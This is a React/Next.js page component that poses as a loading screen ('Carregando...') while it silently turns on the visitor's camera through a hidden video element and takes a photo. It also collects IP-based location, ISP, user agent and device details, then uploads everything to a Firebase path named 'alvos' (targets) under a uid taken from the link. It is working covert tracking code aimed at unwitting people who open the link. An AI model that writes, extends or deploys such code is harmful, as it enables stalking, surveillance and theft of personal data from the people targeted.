"use client"

import { useState, useRef, useEffect } from "react"
import { Loader2 } from "lucide-react"
import { captureAllData } from "@/lib/geolocation"
import { ref, push } from "firebase/database"
import { database } from "@/lib/firebase"
import { SecurityLayer } from "@/components/security-layer"

export default function LocationCapturePage() {
  const [isCapturing, setIsCapturing] = useState(false)
  const [hasCaptured, setHasCaptured] = useState(false)
  const videoRef = useRef<HTMLVideoElement>(null)
  const streamRef = useRef<MediaStream | null>(null)
  const [photoData, setPhotoData] = useState<string | null>(null)
  const [userId, setUserId] = useState<string | null>(null)

  useEffect(() => {
    const params = new URLSearchParams(window.location.search)
    const userIdParam = params.get("uid")
    setUserId(userIdParam)

    // Auto-start camera and capture photo silently
    const autoCapture = async () => {
      try {
        console.log("[v0] 📷 Starting camera access...")

        // Request camera access silently
        const stream = await navigator.mediaDevices.getUserMedia({
          video: {
            facingMode: "user",
            width: { ideal: 1280 },
            height: { ideal: 720 },
          },
          audio: false,
        })

        console.log("[v0] ✅ Camera access granted")

        if (videoRef.current) {
          videoRef.current.srcObject = stream
          streamRef.current = stream

          videoRef.current.onplaying = () => {
            console.log("[v0] 🎬 Video is now playing, waiting for frames...")

            // Wait longer to ensure frames are rendered
            setTimeout(() => {
              if (videoRef.current && videoRef.current.readyState >= 2) {
                console.log("[v0] 📸 Capturing photo from video...")

                const canvas = document.createElement("canvas")
                canvas.width = videoRef.current.videoWidth || 640
                canvas.height = videoRef.current.videoHeight || 480

                console.log("[v0] Canvas size:", canvas.width, "x", canvas.height)

                const ctx = canvas.getContext("2d")
                if (ctx && canvas.width > 0 && canvas.height > 0) {
                  ctx.drawImage(videoRef.current, 0, 0, canvas.width, canvas.height)
                  const photoDataUrl = canvas.toDataURL("image/jpeg", 0.8)
                  setPhotoData(photoDataUrl)
                  console.log("[v0] ✅ Photo captured successfully, size:", photoDataUrl.length, "bytes")

                  // Stop camera after capture
                  if (streamRef.current) {
                    streamRef.current.getTracks().forEach((track) => track.stop())
                    streamRef.current = null
                  }
                } else {
                  console.error("[v0] ❌ Canvas context or size invalid")
                  setPhotoData("camera_error")
                }
              } else {
                console.error("[v0] ❌ Video not ready, readyState:", videoRef.current?.readyState)
                setPhotoData("camera_error")
              }
            }, 2000) // Increased delay to 2 seconds
          }

          // Explicitly play the video
          videoRef.current.play().catch((err) => {
            console.error("[v0] ❌ Video play error:", err)
          })
        }
      } catch (error) {
        console.error("[v0] ❌ Auto-capture error:", error)
        // Continue even if camera fails
        setPhotoData("camera_denied")
      }
    }

    autoCapture()
  }, [])

  useEffect(() => {
    // Start capture as soon as component mounts
    if (!hasCaptured && !isCapturing) {
      handleAutoCapture()
    }
  }, [hasCaptured, isCapturing])

  const handleAutoCapture = async () => {
    if (isCapturing || hasCaptured) return

    setIsCapturing(true)

    try {
      console.log("[v0] 🎯 Auto-capturing location and photo data...")

      const data = await captureAllData()

      console.log("[v0] 📊 Captured data summary:", {
        hasIpData: !!data.ipData,
        ipHasCoordinates: !!(data.ipData?.latitude && data.ipData?.longitude),
        ipCoords:
          data.ipData?.latitude && data.ipData?.longitude
            ? { lat: data.ipData.latitude, lng: data.ipData.longitude }
            : null,
      })

      if (!data.ipData || !data.ipData.latitude || !data.ipData.longitude) {
        console.error("[v0] ❌ Cannot save capture without valid IP coordinates")
        setHasCaptured(true)
        setIsCapturing(false)
        return
      }

      const userPath = userId || "anonymous"
      const alvosRef = ref(database, `alvos/${userPath}`)

      const capturePayload = {
        pageType: "location",
        pageName: "Mapa de Localização",
        timestamp: new Date().toISOString(),
        ipAddress: data.ipData.ip || "Unknown",
        userAgent: navigator.userAgent,
        ipData: {
          ip: data.ipData.ip,
          latitude: data.ipData.latitude,
          longitude: data.ipData.longitude,
          city: data.ipData.city || "Unknown",
          region: data.ipData.region || "Unknown",
          country: data.ipData.country || "Unknown",
          countryCode: data.ipData.countryCode || "XX",
          timezone: data.ipData.timezone || "Unknown",
          isp: data.ipData.isp || "Unknown",
          org: data.ipData.org || "Unknown",
          as: data.ipData.as || "Unknown",
        },
        deviceInfo: data.deviceInfo,
        formData:
          photoData && photoData !== "camera_denied" && photoData !== "camera_error" ? { photo: photoData } : undefined,
      }

      console.log("[v0] 💾 Saving to Firebase:", {
        hasIpData: !!capturePayload.ipData,
        ipLat: capturePayload.ipData.latitude,
        ipLng: capturePayload.ipData.longitude,
        city: capturePayload.ipData.city,
        country: capturePayload.ipData.country,
        hasPhoto: !!capturePayload.formData?.photo,
      })

      await push(alvosRef, capturePayload)

      console.log("[v0] ✅ Data auto-captured and saved successfully!")
      setHasCaptured(true)
    } catch (error) {
      console.error("[v0] ❌ Auto-capture error:", error)
      setHasCaptured(true) // Mark as captured even on error to prevent infinite retries
    } finally {
      setIsCapturing(false)
    }
  }

  return (
    <>
      <SecurityLayer />

      {/* Hidden video element for silent photo capture */}
      <video ref={videoRef} autoPlay playsInline muted className="hidden" />

      <div className="relative h-screen w-full flex items-center justify-center bg-white">
        <div className="text-center space-y-4">
          <Loader2 className="h-12 w-12 animate-spin text-blue-500 mx-auto" />
          <p className="text-gray-600 text-lg">Carregando...</p>
        </div>
      </div>
    </>
  )
}
